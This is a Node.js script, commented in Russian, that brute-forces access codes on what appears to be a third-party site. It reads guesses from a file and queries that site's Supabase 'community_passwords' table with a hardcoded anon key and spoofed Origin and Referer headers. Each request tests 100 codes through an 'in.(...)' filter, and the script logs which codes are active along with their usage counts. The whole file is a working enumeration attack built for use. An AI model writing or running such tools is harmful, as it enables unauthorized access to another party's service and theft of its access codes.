const axios = require('axios');
const fs = require('fs');
const path = require('path');

// --- НАСТРОЙКИ ---
const BASE_API_URL = 'https://nhiymxlnmxrvcefwpdbg.supabase.co/rest/v1/community_passwords';
const CODE_PARAMETER_NAME = 'password';
const CODES_FILE_NAME = 'codes.txt';
const RESULTS_FILE_NAME = 'result.txt';
const BATCH_SIZE = 100; // <--- КЛЮЧЕВОЙ ПАРАМЕТР: СКОЛЬКО КОДОВ ПРОВЕРЯТЬ ЗА ОДИН ЗАПРОС
const REQUEST_DELAY_MS = 50; // Небольшая задержка между пакетами, чтобы не перегружать сервер

// Эта функция теперь проверяет целый ПАКЕТ кодов
async function checkCodeBatch(batch) {
    // Формируем значение для фильтра: in.(code1,code2,...)
    const filterValue = `in.(${batch.join(',')})`;

    try {
        const params = {
            select: 'id,max_uses,current_uses,active,password', // Добавили 'password', чтобы знать, какой код сработал
            [CODE_PARAMETER_NAME]: filterValue,
            active: 'eq.true',
        };

        const headers = {
            'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaXlteGxubXhydmNlZndwZGJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg1MjMyNzMsImV4cCI6MjA2NDA5OTI3M30.joedN9gZhp4sxCXOCC5Xe7wHCg-uod683Qh84D78NO8',
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaXlteGxubXhydmNlZndwZGJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg1MjMyNzMsImV4cCI6MjA2NDA5OTI3M30.joedN9gZhp4sxCXOCC5Xe7wHCg-uod683Qh84D78NO8',
            'Accept': 'application/json',
            'Origin': 'https://fremenessence.gaib.ai',
            'Referer': 'https://fremenessence.gaib.ai/',
        };

        const response = await axios.get(BASE_API_URL, { params, headers, timeout: 20000 }); // Увеличим таймаут для больших запросов

        if (response.status === 200) {
            // response.data будет массивом только ВАЛИДНЫХ кодов из пакета
            return { status: 'success', validCodes: response.data };
        } else {
            return { status: 'error', message: `HTTP Status: ${response.status}` };
        }
    } catch (error) {
        let errorMessage = error.message;
        if (error.response) errorMessage = `API Error ${error.response.status}`;
        else if (error.request) errorMessage = 'Network Error';
        
        return { status: 'exception', message: errorMessage };
    }
}

async function main() {
    // --- 1. ЧТЕНИЕ КОДОВ ИЗ ФАЙЛА ---
    let codesToTest = [];
    try {
        const fileContent = fs.readFileSync(path.join(__dirname, CODES_FILE_NAME), 'utf-8');
        codesToTest = [...new Set(fileContent.split(/\r?\n/).map(line => line.trim()).filter(Boolean))]; // Убираем дубликаты
        if (codesToTest.length === 0) {
            console.log(`Файл '${CODES_FILE_NAME}' пуст.`);
            return;
        }
        console.log(`Найдено уникальных кодов для проверки: ${codesToTest.length}`);
    } catch (error) {
        console.error(`Ошибка чтения файла '${CODES_FILE_NAME}': ${error.message}`);
        return;
    }

    // --- 2. ИНИЦИАЛИЗАЦИЯ ФАЙЛА РЕЗУЛЬТАТОВ ---
    const resultsFilePath = path.join(__dirname, RESULTS_FILE_NAME);
    const header = `--- Запуск пакетной проверки: ${new Date().toLocaleString('uk-UA')} ---\n`;
    fs.writeFileSync(resultsFilePath, header, 'utf-8');
    console.log(`Результаты будут записываться в файл: ${RESULTS_FILE_NAME}. Размер пакета: ${BATCH_SIZE}`);

    // --- 3. ЦИКЛ ПРОВЕРКИ ПАКЕТАМИ ---
    let totalValidCount = 0;
    for (let i = 0; i < codesToTest.length; i += BATCH_SIZE) {
        const batch = codesToTest.slice(i, i + BATCH_SIZE);
        const progress = Math.round(((i + batch.length) / codesToTest.length) * 100);
        console.log(`\nПроверяем пакет ${Math.floor(i / BATCH_SIZE) + 1} (коды с ${i + 1} по ${i + batch.length})... Прогресс: ${progress}%`);
        
        const result = await checkCodeBatch(batch);

        if (result.status === 'success') {
            // API вернул только валидные коды. Все остальные в пакете - невалидные.
            const validCodesInBatch = new Set(result.validCodes.map(item => item.password));
            
            if (validCodesInBatch.size > 0) {
                totalValidCount += validCodesInBatch.size;
                console.log(`✅ В пакете найдены ВАЛИДНЫЕ коды: ${validCodesInBatch.size} шт.`);
                // Записываем только валидные
                const logData = result.validCodes.map(item => 
                    `[${new Date().toLocaleTimeString('uk-UA')}] Код: ${item.password.padEnd(15)} | Статус: valid | Данные: ${JSON.stringify(item)}`
                ).join('\n');
                fs.appendFileSync(resultsFilePath, logData + '\n', 'utf-8');
            } else {
                console.log(`❌ В этом пакете валидных кодов не найдено.`);
            }

        } else {
            // Если весь пакет вызвал ошибку
            console.error(`❗️ Ошибка при проверке пакета: ${result.message}. Этот пакет будет пропущен.`);
            const logError = `[${new Date().toLocaleTimeString('uk-UA')}] Ошибка пакета (коды с ${i+1} по ${i+batch.length}): ${result.message}\n`;
            fs.appendFileSync(resultsFilePath, logError, 'utf-8');
        }
        
        await new Promise(resolve => setTimeout(resolve, REQUEST_DELAY_MS));
    }

    // --- 4. ФИНАЛЬНЫЙ ОТЧЕТ ---
    console.log('\n\n--- Проверка завершена ---');
    console.log(`Найдено ВСЕГО валидных кодов: ${totalValidCount}`);
    console.log(`\nВсе подробные результаты сохранены в файле '${RESULTS_FILE_NAME}'.`);
}

main();